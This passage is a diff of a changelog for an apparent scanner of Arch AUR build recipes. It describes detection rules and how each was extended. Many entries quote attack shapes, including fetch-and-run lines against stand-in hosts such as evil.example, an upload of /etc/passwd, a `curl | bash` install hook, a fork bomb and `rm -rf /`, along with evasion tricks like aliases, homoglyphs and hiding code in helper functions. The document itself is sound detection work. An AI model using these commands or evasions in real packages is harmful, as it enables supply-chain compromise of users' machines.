+  `C009` (INFO, weight 0) reports the same move alongside a version bump, so
+  the pair is visible rather than only the alarming half.
+
+  The third carrier needed no new reading at all. git emits *no diff body*
+  for a binary, so a committed ELF being replaced produced an empty diff and
+  R118 reported the same thing either way - it claims the file's presence,
+  not its identity. A git blob id is a content hash and both trees are
+  already open, so comparing them answers "did this file change" exactly
+  without opening either version. Replaced fires; untouched and newly-added
+  stay silent.
+
+  This does not close the upstream gap, it changes what the gap costs: a swap
+  must now happen either under a new version, where a reader is looking, or
+  under a stable one, where it is claimed. A first analysis has no previous
+  identity to compare against, and a legitimate release containing a payload
+  is indistinguishable from an ordinary update - those remain out of reach by
+  construction.
+
+- **X015: work scheduled to run after the build.** A package *declares*
+  units and timers as files, which pacman installs and an administrator
+  enables; R054 claims those and a reader can see them. Running `crontab -`,
+  `systemd-run`, `at`, `incrontab` or `systemctl start` during the build is a
+  different act - it registers work on the machine doing the building, now,
+  outside anything pacman records or can remove. The scheduled command is
+  usually a path the recipe just wrote, so the chain reads as *fetch, write,
+  arrange to run later*, and every arm of it stopped at R061's
+  undeclared-fetch HIGH because the run never happens on a line any execution
+  rule reads. `systemctl enable` is deliberately absent: an `.install`
+  scriptlet enabling its own unit is ordinary packaging.
+
+- **A driver's command argument is still an execution.** `expect -c "spawn
+  bash s.sh"`, `script -qfc "bash s.sh"`, `tmux new-session -d "..."`,
+  `screen -dmS x bash s.sh`, `find ... -exec bash {} +` and
+  `xargs -I{} bash {}` all run a command the execution patterns never saw,
+  because what they matched was the driver's own name. The command text is
+  now re-scanned with the same vocabulary - once, not recursively, since a
+  driver running a driver is not a shape worth unbounded re-entry on
+  attacker text. For `find` the `{}` resolves through the `-name` pattern;
+  for `xargs` it resolves through the left-hand side of the pipe, because a
+  bare `*` would name every file and so claim nothing about any of them.
+
+- **Executing from a clone pairs with the clone.** A checkout names a
+  *directory*, and everything under it came from the remote, so the pairing
+  is by prefix rather than by filename: `git clone URL r` then `bash
+  r/run.sh` is a fetch and an execution of what it fetched. `make -C r`
+  needed one step more - `-C` had been excluded from the implicit-input arm
+  on the reasoning that it "names the input explicitly", but it names a
+  *directory*, not a file, so the implicit input still applies relative to
+  it.
+
+- **Container and object stores were the widest remaining blind spot.**
+  `docker pull evil/img && docker run evil/img` fetches a filesystem and
+  executes its entrypoint; `snap` and `flatpak` install and then run confined
+  applications; `helm` applies charts that carry hooks; `lxc launch` starts a
+  container from an image. None of them names a URL, which is why the fetch
+  inventory never saw them - but "resolve a name from a registry and run what
+  comes back" is exactly what X011 already claims, so they belong there.
+
+  The object stores are the same fact with a different notation: `s3cmd get
+  s3://…`, `aws s3 cp`, `rclone copy remote:/…`, `ipfs get <cid>`,
+  `git lfs pull`. Where the address carries a scheme, R061 attributes it as
+  before. Where it is opaque - a content identifier, a remote name - there is
+  no URL to quote, so the honest claim is the *pairing*: the fetch writes a
+  file and the next line runs it, which R137 now sees because these clients
+  name their destination positionally or with `-o`.
+
+- **Fullwidth Latin is a whole homoglyph alphabet.** `ｃｕｒｌ` renders as the
+  real name and executes as one that does not exist. U+FF01-U+FF5E folds onto
+  ASCII by a fixed offset of 0xFEE0, and the confusable table listed only the
+  handful of individual lookalikes that had been reported. Generated rather
+  than enumerated, because the mapping is arithmetic and ninety-four
+  hand-written entries invite one to go missing. It now scores the same 60 as
+  the Cyrillic spelling that was already caught.
+
+- **X014: an environment variable whose value is code.** X012 covers a
+  toolchain *path* redirected into the source tree - which binary the next
+  compile step invokes. This is the other half. `BASH_ENV` and `ENV` are
+  sourced by every non-interactive shell that bash or sh starts, so setting
+  one makes every later `bash -c`, every sub-make recipe line and every
+  helper script run the named file first; `PROMPT_COMMAND`, `PS0` and `PS4`
+  are evaluated as commands; `BASH_FUNC_x%%` smuggles a whole function
+  through the environment; `GIT_SSH_COMMAND`, `LESSOPEN` and `LD_AUDIT` are
+  run by the tools and the loader that read them. The assignment *is* the
+  execution. It stands down on the inert values that make one of these quiet
+  rather than active (`PAGER=cat`, `EDITOR=true`), and none of the covered
+  variables appears in the benign corpus.
+
+- **A `for` loop was only the most visible binding.** The positional form
+  (`set` with a `"$srcdir"/*.sh` argument list)
+  puts the same glob into `$1` and `$@`, `A=(*.sh)` into an array cell, and
+  `mapfile -t A < <(ls *.sh)` fills one from a pipeline - and the execution
+  is `bash "$1"`, `bash $@` or `bash "${A[0]}"`. Every one of those scored
+  zero while the `for` spelling scored 85. Two things had to change: the
+  binding forms, and the fact that bindings were computed per *line* when
+  the binding and the execution are two statements - so a one-liner was the
+  only shape that could ever resolve.
+
+- **`bash -c "$E"` where `E` was assigned earlier.** The same dynamic payload
+  as `bash -c "$(...)"` with the substitution moved one line up; R040 saw
+  only the inline form. A bare `$NAME` argument is dynamic too, and what
+  reaches the pattern unresolved is precisely what the tokenizer could not
+  read.
+
+- **Run-a-remote-module verbs.** `cargo script <url>`, `bun x <url>`, `pkgx
+  <url>`, `uvx <url>` and `nix run` fetch and execute in a single word with
+  no install step to notice - the one-shot runner class again, one ecosystem
+  further on.
+
+- **A sandbox is a wrapper like any other.** `bwrap --ro-bind / / bash s.sh`
+  executes `s.sh` exactly as `bash s.sh` does, and the fetch that wrote it
+  paired with nothing - `chroot`, `bwrap`, `firejail`, `nsjail`, `unshare`,
+  `proot` and the container entrypoints all left the chain at 50. They take
+  *positional* arguments (`chroot /tmp/root`, `bwrap --ro-bind / /`), so the
+  flags-only wrapper form could not reach the executor past them; the
+  vocabulary now carries both shapes.
+
+  This was the third time a second copy of a shared list drifted:
+  `delivery._EXEC_PREFIX` was its own wrapper inventory, so additions to
+  `config.EXEC_WRAPPER` reached R001's pipe arm and not R137's pairing. It
+  reads the shared definition now, and a test asserts it.
+
+- **A keyring is a trust root.** X013 gains `gpg --import`, `--recv-keys`,
+  `pacman-key --add`, `apt-key add` and `rpm --import`: importing a key makes
+  every later signature check pass against it, which is the same substitution
+  as replacing a CA bundle with verification left switched on, so it reads as
+  diligence.
+
+  It stands down on the pattern a signature-verifying package actually uses -
+  `gpg --homedir="$dir" --import "$srcdir/maintainer.gpg"` - where the key
+  arrives through `source=()`, so makepkg checksums it and the diff shows any
+  change. The one benign-corpus hit was exactly that shape. A key *fetched* at
+  build time is not covered by that chain, and R061/R137 claim the fetch on
+  its own line.
+
+- **`ld.so.conf.d` belongs in the persistence surface after all.** A directory
+  added to the loader search path is code loaded into every process that
+  starts afterwards. It was excluded in a first pass that measured five paths
+  together and read the aggregate as if it applied to each; measured on its
+  own it appears in **zero** of the 3,246 benign diffs. `tmpfiles.d`,
+  `udev/rules.d` and `modprobe.d` stay out on their own numbers.
+
+- **A loop was a blind spot in two separate places.** `for f in *.sh; do
+  bash "$f"; done` executes every committed helper, and neither half of that
+  was read: `do` was not treated as introducing a command, so the loop body
+  produced no execution at all, and a loop variable or glob names a *set* of
+  committed files, which an equality test against the manifest could never
+  match. The literal spelling scored 85 and every loop spelling scored 0.
+  Both are fixed - `do`/`then`/`else` are command positions in shell grammar,
+  a variable and a `*` are the same wildcard for matching, and a bare loop
+  variable resolves through its `for ... in` binding. A pattern that would
+  match everything still claims nothing, because it names nothing.
+
+- **A directory paired with another directory.** Two empty basenames compare
+  equal, so `install -d "$pkgdir/usr/share/icons/"` and an unrelated `/opt/`
+  read as "writes /usr/share/icons/ and then executes it" - a Critical on a
+  package installing icons. A directory is not a payload whichever verb
+  created it, and the filter is applied once for every write arm rather than
+  guarded per arm.
+
+- **An upload was described as a download.** R061 claimed `curl -T
+  /etc/passwd ftp://host` as an undeclared *download*, which is the wrong
+  direction for the one operation that takes data off the machine; R087 read
+  a host list only, so an upload anywhere but a drop host was never claimed
+  as one. R087 gains a second condition - and deliberately not "any host":
+  `tests/test_gap_rules.py` pins the design principle that the rule is
+  "defined by an auditable host list, not by a guess about what an endpoint
+  is for", so the addition is a second auditable list, of paths no build
+  artifact lives at (`/etc/`, `~/.ssh/`, `$HOME/`, `/root/`, `/proc/`). A
+  build sends nothing off the machine; one reading from outside its own tree
+  is not uploading a build artifact. `curl -F file=@report.json
+  https://ci.example.com` stays quiet under both.
+
+- **A `NameError` on the full-AUR property path.** A sweep replacing
+  `.splitlines()` with the tokenizer's `split_lines()` renamed the receiver
+  instead of the call: `new_pkgbuild.splitlines()` became
+  `new_split_lines(pkgbuild)`. That is a live crash on every property
+  extraction with no `.SRCINFO` to prefer - the fallback the function exists
+  to provide - and nothing exercised it, so the suite stayed green. Found by
+  `ruff`'s undefined-name check rather than by a test, which is the useful
+  detail: a rename that produces a valid-looking call is invisible to
+  everything that does not run it.
+
+- **R054 claimed cron and system units; the rest of the autostart surface
+  was silent.** A `.desktop` in `xdg/autostart` starts with the session, a
+  systemd **user** unit starts with the user's login (no root required, and
+  if anything more reliable than a system unit - it had been pinned in a test
+  as *non*-persistence), `profile.d` and `bash.bashrc.d` run in every new
+  shell, `Xsession.d` at graphical login, a D-Bus policy grants a service the
+  right to be activated on demand, and `sudoers.d` decides who may become
+  root. All of them are claimed now.
+
+  Two things were deliberately left out after measuring. `/usr/share/
+  applications` is where every GUI package puts its menu entry - it runs when
+  the user clicks it, which is not persistence - and `tmpfiles.d`,
+  `sysusers.d`, `udev/rules.d`, `modprobe.d` and `ld.so.conf.d` are what
+  ordinary driver and library packages ship; including them fired on 30
+  benign packages and would have made the rule mean "this package installs
+  files".
+
+  Widening it also exposed that the rule matched a path *mention* rather than
+  a write: `if [[ -f /etc/profile.d/cuda.sh ]]` tests for a file rather than
+  planting one. A write verb is now required, which removed a pre-existing
+  false positive - the benign flag rate ends one *below* where it started.
+
+- **Verification was checked on one checksum array out of seven.**
+  `detect_checksum_changes` read `sha256sums` alone, on the reasoning that it
+  is makepkg's default. makepkg verifies with whichever array the package
+  declares, and modern AUR packages increasingly ship `b2sums`, so the default
+  was becoming the minority case: `b2sums=('SKIP')` disabled verification and
+  reported `unchanged`, which is R004 not firing at all. Every array counts
+  now, and a SKIP anywhere wins over a hash elsewhere - the array carrying
+  SKIP is the one that stopped verifying a source.
+
+  Widening it exposed a second defect underneath. The justification checks
+  (`is_skip_justified`) anchored on *added* lines, so a `-git` package whose
+  `source=(git+...)` sat on an unchanged context line had its mandatory SKIP
+  read as unjustified. That was invisible while only `sha256sums` was read,
+  because these packages carry `b2sums` or `md5sums`. A VCS source is a fact
+  about the package whether or not this diff changed the line; removals still
+  justify nothing. Net effect on the locked benign corpus: 26 spurious HIGHs
+  became 6, and those six are genuine - remote tarballs from `deb.debian.org`,
+  `dl.discordapp.net` and GitHub releases with verification switched off.
+  Flag rate 377 -> 384.
+
+- **A recipe that installs packages.** `pacman -U ./evil.pkg.tar.zst` inside
+  `build()` installs a package as root, scriptlets and all, and `pacman -S`
+  downloads one first. R081 claims *foreign* package managers in install
+  hooks; pacman is not foreign and a build function is not a hook, so this
+  fell between the two - a recipe has no business installing packages, since
+  makepkg resolves `depends` for that. X011 covers them, and the local-path
+  stand-down that mitigates `pip install .` deliberately does not apply: for
+  the distribution's own tools a leading `./` means a local package installed
+  as root, not an artifact this recipe just built.
+
+- **A companion referenced by a pattern was never read.** `for i in 1 2 3; do
+  bash r$i.sh; done` and `for f in *.sh` name a *set* of committed files, and
+  companion selection tested for a literal name - so a payload split across
+  `r1.sh`, `r2.sh` and `r3.sh` was committed, executed, and never scanned. A
+  variable and a `*` are the same wildcard for this purpose. A reference that
+  would match everything (`bash "$f"` alone) selects nothing, because it names
+  nothing.
+
+- **`cvs` and its root notation.** `cvs -d :pserver:host:/repo checkout` names
+  a remote in a form that is neither a URL nor an ssh address, and the client
+  pattern swallowed the root between the verb and the command - so looking
+  only at the text *after* the client found nothing.
+
+- **A build driver is an execution of its input file.** `curl -o Makefile URL`
+  followed by `make` fetches a script and runs it, and neither half was paired
+  with the other: `make` matched no execution pattern, and `Makefile` sat in
+  the benign-artifact exemption - which claims "this file came with the
+  project" and was reading the filename instead of the provenance. The same
+  correction the committed-`configure` case needed. `make -f zz.mk`,
+  `cmake`, `ninja` and `meson` resolve their input the same way.
+
+- **A fetch with no destination still writes a file.** `wget URL` saves the
+  URL's basename and `curl -O URL` asks for exactly that, so the file the next
+  line ran was never written down anywhere and R137 had nothing to pair.
+  `curl -O` also takes no argument, and reading the URL after it as a
+  destination produced a path like `https:/e.x/x.sh`.
+
+- **`conflicts=` had no counterpart to `replaces=`.** All three fields insert
+  a package in front of a name the ecosystem relies on: `provides` and
+  `replaces` claim to *be* it, and `conflicts` makes pacman refuse to install
+  it alongside - which removes the real package just as effectively.
+  `replaces=('firefox')` scored HIGH and `conflicts=('firefox')` scored
+  nothing. Symmetric now, with the own-variant suppression that the other two
+  already had, and no change on the benign corpus.
+
+- **A heredoc's destination can be named on either side of the delimiter.**
+  `bash <<EOF` puts it before and `cat <<'EOF' | sh` puts it after; only the
+  left half was read, so the piped form - which is how the shape is usually
+  written - stayed classified as data.
+
+- **`scp host:/x.sh` is a remote read.** The user part is optional, and
+  requiring `@` left the fetch unattributed while R137 paired the write with
+  its execution. The host must carry a dot, or every `make target:` reads as a
+  remote.
+
+- **A comment was claimed as live code.** `# curl ... | bash` scored R001
+  CRITICAL and R061 HIGH - 85, a Critical band - on a line that runs nothing.
+  Comments were filtered for raw-line rules by `filter_raw_lines` and not for
+  resolved ones. `tests/test_injection_surface.py` had pinned this explicitly
+  as *"pinned, not endorsed ... so that a change to it is a decision rather
+  than a surprise"*; this is that decision. A rule whose target is the reader
+  rather than the shell opts back in with `include_comments`, which is what
+  R012 and R013 do.
+
+- **A byte-order mark was a FATAL finding.** R013 claims U+FEFF wherever it
+  appears, so a PKGBUILD saved by an editor that writes a BOM scored
+  100/Critical - the maximum severity this tool has - for its encoding. A BOM
+  is an encoding artifact when it opens a line and a zero-width character in
+  code anywhere else, and mid-line stays claimed: `make\ufeffinstall` displays
+  as two words and runs as one.
+
+- **`x=` and `x=''` were different assignments.** The value was required, so
+  the empty form was never recorded - and bash expands `ba${x}sh` to `bash`.
+  X002 also gained the spliced form: every shape anchored the variable at the
+  start of the word, so `${D}url` was claimed and `ba${x}sh` was not. That is
+  the *only* word-splitting spelling that runs; `ba<TAB>sh` and
+  `ba<U+3164>sh` are "command not found", verified against bash itself.
+
+- **Companion selection required a literal name, and skipped `.install`.**
+  `npm install` reads package.json without the recipe naming it, and
+  `cargo build` compiles build.rs - the records whose contents actually run
+  were exactly the ones excluded. A `.install` scriptlet runs as root and is
+  the most consequential text in an AUR package; a hook committed in an
+  earlier commit was never read, so `post_install() { curl ... | bash; }`
+  scored 15 for the attribute change and nothing for the payload.
+
+- **A path traversal read as a different directory.** The shell does not
+  collapse `..` - the kernel does, when the file is opened - so
+  `"$pkgdir"/lib/../etc/cron.d/y` writes into `/etc/cron.d` while every rule
+  anchored on `$pkgdir/etc/cron.d/` read a path into `/lib`.
+
+- **`_NETWORK_FETCH_RE` was quadratic.** It paired a client with a URL across
+  a lazy span, which on any line holding a client and no address retried
+  every split point: a full-length hostile line measured 304 ms, and the
+  regex-safety audit refused the pattern. Replaced by two anchored searches
+  and a position comparison, which also let the address be an ssh remote
+  (`git clone git@evil.example:r.git`) rather than only an `http(s)://` URL.
+
+- **The decoder alphabet had one spelling per operation.** X001 claimed
+  base32/basenc/uudecode/openssl/xxd/tr and, after the previous entry,
+  compression - on the reasoning that they "decode the same payload into the
+  same shell". The zip family reads a member to stdout with verbs that look
+  nothing like a decompressor flag, and decryption is decoding too:
+  `unzip -p p.zip | bash`, `funzip`, `ar p`, `unrar p`, `gpg -d` and
+  `gpg --decrypt` all intersected no rule at all. `basenc` was worse than a
+  gap - its arm required `--algorithm` *before* `-d`, so reversing two flags
+  on the same command took a CRITICAL to nothing. All now fire.
+
+- **The write tracker knew only what the shell itself does.** R121/R124
+  recognised `cat`, `tee`, `printf`, `echo` and shell redirects, so every
+  other way of putting decoded bytes in a file left the write unseen and the
+  `bash s.sh` on the next line paired with nothing. Three distinct escapes,
+  all now tracked: an output *flag* (`openssl enc -d -in p.enc -out s.sh`,
+  `gpg -d -o`), a redirect from a producer that was not on the list
+  (`gzip -dc p.gz > s.sh`, `funzip`, `xxd -r`, `unzip -p`), and an interpreter
+  one-liner (`python3 -c "open('s.sh','w').write(...)"`,
+  `node -e writeFileSync`). `dd of=X if=Y` failed for a third reason - the
+  destination was read as the *last token* on the line, so the canonical GNU
+  flag order was parsed as writing to `if=Y`.
+
+  The producer list is deliberately the decoder alphabet rather than "any
+  command that writes". `make > build.log` writes a file and is not a
+  payload, and `-o` is among the most overloaded flags there is: `gcc -o`
+  names an output, `install -o root` names an owner.
+
+- **`curl -Lo` and `wget -qO` never paired with the execution.**
+  `_FETCH_OUTPUT_RE` required the output flag to stand alone, and the
+  clustered forms are the ones people actually type. With an undeclared URL
+  the R061 backstop still fired, but with a *declared* source R061 stands
+  down and the whole fetch-then-execute chain ran under a score of 25. The
+  cluster must end in the output letter, which is the one whose argument
+  follows.
+
+- **An interpreter that decodes and executes in one expression.**
+  `python3 -c 'exec(b64decode("..."))'`, `perl -MMIME::Base64 -e 'eval(...)'`
+  and `node -e 'eval(atob(...))'` have no pipe for X001 to anchor on and no
+  shell word for X002 to read - both the decode and the exec are inside the
+  quoted script, which is the point of writing it that way. Covered now,
+  including the leading-flag form (`perl -MMIME::Base64 -e`), because
+  anchoring on the interpreter's next token would have made a module import
+  an escape.
+
+- **An alias is a rename, and every fetch rule keyed on the name.**
+  `alias dl='curl -fsSL'` followed by `dl URL | bash` removed the downloader
+  from R001, R010, R061 and R137 at once while bash ran the identical
+  pipeline. The variable form (`CMD=curl; $CMD ...`) was already resolved by
+  the tokenizer, so leaving aliases alone made the harder-to-read spelling
+  the safer one. The tokenizer now builds an alias table beside the variable
+  table and expands in command position only - bash expands an alias as the
+  first word of a simple command, and expanding it in argument position
+  would invent text the shell never produces.
+
+  It had to be added in *two* places. `_resolve_added_lines` and
+  `tokenize_and_resolve_indexed` are parallel resolvers, and the second is
+  what feeds every `match_target = "resolved"` rule including R001; fixing
+  one would have been the same defect the aliases exploit - a spelling one
+  path understands and the other does not.
+
+- **A committed `configure` was exempt because of its name.** R124's
+  benign-artifact list says "this is the project's own build flow", which is
+  true of an autotools `configure` inside the extracted tarball and false of
+  one committed to the AUR repository and named in no `source=()`. The
+  exemption now asks where the file came from rather than what it is called.
+
+- **A stale `rules.toml` cost detection and only one command said so.** The
+  drift report added above was reachable only from `config sync-rules`, which
+  nobody runs unprompted. `trustsight status` now carries a "Rule patterns"
+  row and, when patterns are stale, says what it costs: those rules detect
+  less on this install than their documentation describes.
+
+- **A committed companion file over the read budget was dropped in silence,
+  and one padded file starved every companion after it.** `analyze_package`
+  promises that a companion's "committed content is scanned with the same
+  rules"; past `MAX_COMPANION_BYTES` (64 KiB) that stopped holding and nothing
+  recorded it, so a payload in the tail of a committed `Makefile` scored
+  identically to a package with no companions at all - which is what
+  [B2](security.md#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete)
+  forbids.
+
+  The skip was also a `break`, not a `continue`, and the budget was a single
+  pool drained in sort order. Since the attacker names both files, they choose
+  the order: a large benign `aaa-pad` consumed the budget and ended the loop,
+  and the payload in `zz.mk` was never read despite being tiny. Companions now
+  get an equal share of the same total budget, so no one file decides how much
+  the others get; an oversized file has its head read within that share instead
+  of being dropped whole; and anything cut raises a `companion_truncated`
+  coverage gap. Spends no more bytes than before.
+
+  A hardening test claiming "the oversized blob's data must never be read" had
+  been passing without ever reaching the size check - its fake tree was a list,
+  and `_top_level_blob` subscripts by name, so the function returned early
+  every time. Fixture fixed; the ordering it pins is now actually exercised.
+
+- **The list that silenced a rule was wider than the list that caught.** R061
+  stands down when it believes R001 owns a line, and it made that call with an
+  executor vocabulary R001 had never seen: `curl url | ksh -s` silenced R061
+  and then fell straight through R001, turning a CRITICAL into a LOW. Six
+  copies of the list existed - R001/R002 knew `bash|sh|python|zsh|dash|busybox
+  sh`, R127 knew `bash|sh|zsh|dash`, `_PIPE_TO_SHELL_RE` knew a sixth spelling
+  - and they had been edited separately. There is now one definition
+  (`config.SHELL_EXECUTOR` / `SCRIPT_EXECUTOR` / `ANY_EXECUTOR`), substituted
+  into the rule TOML rather than transcribed into it, covering ksh, mksh,
+  pdksh, yash, posh, ash, busybox ash, perl, ruby and node. All sixteen
+  executors now score 65/High where seven of them scored 5-25. Benign corpus:
+  R001, R002, R040 and R127 fire on **zero** of 3,246 diffs.
+
+- **A compressed payload needed no encoder at all.** X001 claimed
+  base32/basenc/uudecode/openssl/xxd/tr on the reasoning that they "decode the
+  same payload into the same shell". Compression is the same sentence with less
+  work for the attacker: `gzip -dc payload.gz | bash` carries no alphabet a
+  reviewer would notice, and a `.gz` in `source=()` reads as an ordinary
+  archive. Twelve spellings - gzip/gunzip/zcat, xz/xzcat, bzip2/bzcat, zstd,
+  lz4, `tar -xO`, `tar --to-stdout`, `7z -so` - went from scoring 25 to firing
+  X001 CRITICAL. Unpacking on its own stays silent, because unpacking is what
+  build recipes do; only a shell on the far side of the pipe is the signal.
+
+- **A shipped *pattern* fix never reached an existing install.**
+  `drifted_shipped_rules` parsed `pattern` into its field dict and then
+  compared every field except it, so `rules.toml` - written once at install
+  time - kept its original patterns forever and nothing reported the
+  divergence. Both the R001 escape guard and the executor list above would have
+  landed that way. `pattern` is now a semantic field like the rest. On the
+  development machine this immediately surfaced eight drifted rules, including
+  the stale `R007` pattern that had been logging "refusing regex pattern with
+  excessive backtracking risk" on every run.
+
+- **A recipe that pins says so; one that does not said nothing.** `P005`
+  reports a commit pin and `P006` a tag pin, so a recipe tracking
+  `#branch=main` produced no line at all and read exactly like one that pins -
+  while makepkg resolves that ref at build time, meaning upstream chooses what
+  gets compiled. `P008` states it as a declared fact at weight 0, alongside its
+  positive counterparts. Deliberately not a coverage gap: the statement is true
+  of every VCS package by design, and raising a gap would move 20.1% of the
+  benign corpus (653 of 3,246) into Inconclusive, which buys alert fatigue
+  rather than information. Bands are unchanged.
+
+- **Every code rule was keyed to the function a line is *spelled* inside.**
+  R051's `pkgver` scope had already been given the call closure; R061, R062,
+  R081, R119, R121, R124, R136, R137 and R140 had not. All of them asked "does
+  this run during `build()`?" and answered it with "is this line lexically
+  inside a function named `build`?" - and the reviewed party writes the
+  function names. Moving the fetch one function deeper kept the payload fully
+  operational:
+
+  ```bash
+  _fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
+  build()  { _fetch; bash "$srcdir/x.sh"; }
+  ```
+
+  R061 and R137 both stood down and a Critical read as a Low. Scope now
+  follows the call graph for all of them, through any number of hops and
+  through `$(...)`, and the graph is built over the whole current PKGBUILD
+  rather than the hunk, so a helper added by this diff still connects to the
+  `build()` that calls it from outside the visible lines. Cost on the
+  3,246-diff locked benign corpus, measured against the shipped ruleset in an
+  isolated config: the flag rate does not move at all (377 of 3,246, 11.614%,
+  before and after). One diff changes band, Inconclusive to High, and it is a
+  real privileged operation - `_fix_sandbox()`, called from `post_install()`,
+  running `chmod 4755` on a setuid helper. Malicious recall is unchanged at
+  158/175.
+
+- **Two install-hook rules read a printed instruction as a command.** R062 and
+  R081 fired on `echo "==> sudo pacman -S --needed qemu virtiofsd"` and on a
+  `note` helper quoting `sudo systemctl enable --now rustdesk`. Latent before
+  the call closure existed - the `_notes()` helper sat outside every hook
+  scope, so the message never reached the rule - and surfaced by it. Both now
+  consult the message context the rule engine already computes, which is the
+  distinction `_MESSAGE_LINE_RE` was written for.
+
+- **An interpreter is a network client.** R061's fetch pattern listed
+  `python -c ... urllib` - not `python3 -c`, which is the spelling every
+  current recipe uses, and not perl, ruby or node at all. `curl` and `wget`
+  are what a reviewer greps for, so an author avoiding the grep reaches for
+  the runtime that is already a makedepend. The arm now covers
+  `python[23]? -c`, `-m http|urllib|pip`, `perl -e` with LWP/HTTP::, `ruby -e`
+  with Net::HTTP/open-uri and `node -e` with https.get/fetch. It also needed
+  its own tail: a shell command ends at `;`, but `python3 -c 'import
+  urllib;urlretrieve(url)'` puts a semicolon between the client and its URL as
+  a matter of Python syntax, so sharing one `[^|;&]` tail restricted the
+  interpreter arm to one-statement scripts. R137 learns the same shapes,
+  including where `urlretrieve(url, path)` puts what it downloaded, so an
+  interpreter fetch pairs with the later execution of what it wrote.
+
+- **A heredoc into a shell was exempted as if it were data.** `_heredoc_body_indices`
+  treats a heredoc body as file content - correct for `cat > x <<EOF`, and the
+  reason R121/R124/R136/R137 do not double-fire on a generated payload. But
+  `bash <<'EOF'` hands the body to a shell, and the body is then the script
+  that runs, so wrapping the recipe in one turned four rules off for every
+  line inside. The exemption is now decided per heredoc by where it goes.
+
+- **`make` over a repo-committed Makefile executed undeclared code.** `make`
+  names no file on the command line, so no execution pattern ever saw one, and
+  `make` sits in R124's benign-artifact exemption because almost every package
+  runs it. The question is not the command but the file it reads: a `Makefile`
+  committed to the *AUR* repository and absent from `source=()` is code with
+  no checksum over it. R136 gained an arm for the implicit input of `make`,
+  `cmake`, `ninja` and `meson`, gated on a tree manifest so it never guesses.
+  All 14 diffs in the locked benign corpus that commit a build file declare it
+  in `source=()`, and the arm fires on none of them.
+
+- **A committed payload larger than the read bound was invisible, and the run
+  still reported as complete.** `_collect_tree_files` skipped any blob over
+  512 KiB, on the reasoning that a committed payload is small. That is an
+  assumption about the attacker, and R118 fires on a committed ELF - a payload
+  binary is far likelier to be large than small. `tree_analyzed` meanwhile
+  reported True because *some* file had been read, so the incomplete walk
+  presented as a complete one, which is exactly what
+  [B2](security.md#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete)
+  forbids. Large blobs are now streamed for their magic bytes, which tightens
+  the memory bound from 512 KiB to 64 bytes, and the walk reports whether it
+  read everything it was asked for.
+
+  Streaming has a trap of its own that the regression test caught: pygit2's
+  `BlobIO` feeds from a worker thread through a `Queue(maxsize=1)` and
+  `close()` joins that thread, so reading 64 bytes of a 1 MiB blob and closing
+  parks the writer on a full queue forever. The first version of this fix was
+  therefore a hang that any committed 1 MiB file would trigger - a worse
+  denial of service than the gap it closed. The stream is drained before it is
+  closed, and a blob past a 64 MiB ceiling is left unread *and reported*
+  unread rather than paid for in linear time the attacker chooses.
+
+- **Three CRITICAL rules could be walked past by typing.** `S001` (fork bomb),
+  `S002`/`S003` (`rm -rf /`) and crossfire's `home-default` escape each
+  required their pattern pieces within a bounded gap - `{0,120}`, `{0,200}`,
+  `{0,80}`. The bound was there for backtracking safety, but it is also an
+  instruction: `:(){ true; ...x40 :|:& };:` is the same fork bomb, and it read
+  as clean. Each span is now unbounded, with a lookahead assertion where the
+  span must give ground and a possessive quantifier where it must not, and the
+  growth was measured linear over 4x input rather than assumed.
+
+- **A named rule scope was the reviewed party's to choose.** `scope =
+  ["pkgver"]` asks whether code runs during `pkgver`, but it was answered with
+  whether the line sits lexically inside a function *spelled* `pkgver`. Moving
+  the fetch into a helper - `_v() { curl ...; }` called from `pkgver()` -
+  silenced R051, a rename as an evasion and the same shape as the
+  `package_x-bin` scope hole fixed earlier. Scope now follows the call graph
+  transitively, and it changed the fire rate on the 3,246-diff locked benign
+  corpus by exactly zero diffs.
+
+- **A stage that failed reported the same thing as a stage that ran and found
+  nothing.** Every swallowing handler in `analysis/` returned a neutral value
+  on error, which is indistinguishable from "no finding here": an unbalanced
+  quote made `shlex` refuse a whole `source=` array, a git walk that raised
+  fell back to comparing HEAD against HEAD - an empty diff, in which every
+  rule matches nothing - and the verdict still read UNFLAGGED. Nine such
+  handlers now record a `stage_degraded` coverage gap, which forbids an
+  unflagged verdict.
+
+  Making the gap mean something required fixing what it exposed. Two shapes
+  tripped it on ordinary recipes: a multi-line `source=()` array with trailing
+  backslash continuations, and a `#` comment inside such an array containing
+  an apostrophe (`# makepkg doesn't understand SSH signatures`). Both are
+  handled, and one handler was removed outright - `data.decode(errors=
+  "replace")` cannot raise, so the `except` around it could only ever have
+  hidden a bug. The gap fires on 0 of 3,246 benign diffs.
+
 - **Two render paths sanitised untrusted text with the weaker helper.**
   `safe_text` is explicit that the boundary is where a value is *rendered*,
   so stored evidence and JSON stay byte-exact. Two paths used
@@ -947,6 +2188,233 @@
   have.
 
 ### Fixed
+
+- **A negated character class was probed with the one character it excludes.**
+  `_representatives` read `[^\s]` as if it were `[\s]` and derived `" "`;
+  `[^0-9]` derived `"1"`. A pattern probed with input it cannot consume measures
+  zero time, and zero is indistinguishable from fast, so **every pattern driven
+  by a negated class was scored safe without ever being measured** - the same
+  failure that let a quadratic `/+$` ship, surviving in a second form. The
+  representative is now asked of the compiled class instead of inferred from its
+  text, which answers positive and negated classes by the same mechanism.
+
+- **The tokenizer folds case conversion and array slices.** `${c,,}` on
+  `c=CURL` is `curl`; `${a[@]:0:1}` on `a=(curl x)` is `curl`. Neither resolved,
+  so the payload rules saw the expansion rather than the command and X002
+  reported the *technique* instead - which is the crossfire family's job only
+  for as long as the tokenizer cannot do it. Both now reach R001 directly, as
+  the escape fix did before them. `${c//X/}` already resolved and needed
+  nothing.
+
+- **The line-splitting fix had missed four modules, including the whole
+  crossfire family.** The first sweep replaced `name.splitlines()` and could
+  not see `clamp_text(diff_text).splitlines()` - a call on a call. So
+  `sabotage`, `crossfire`, `adoption` and `buildfetch` kept Python's line
+  semantics, and a payload split by `\v` or `U+2028` stayed invisible to the
+  sabotage family, every crossfire rule and the orphan-adoption rules. Also
+  missed: `analysis/pipeline.py`, where `difflib.unified_diff` **generates**
+  the diff from PKGBUILD text, so a `U+2028` in a recipe produced diff lines
+  that did not correspond to the file every downstream rule then read.
+
+  All of them go through `tokenizer.split_lines` now, and
+  `test_no_matching_module_splits_lines_the_python_way` greps for the rest -
+  the defect was that a grep was not general enough, so the fix is a grep that
+  is. It found this one: X008 below could not fire on `U+2028` or NEL, and the
+  reason was not X008.
+
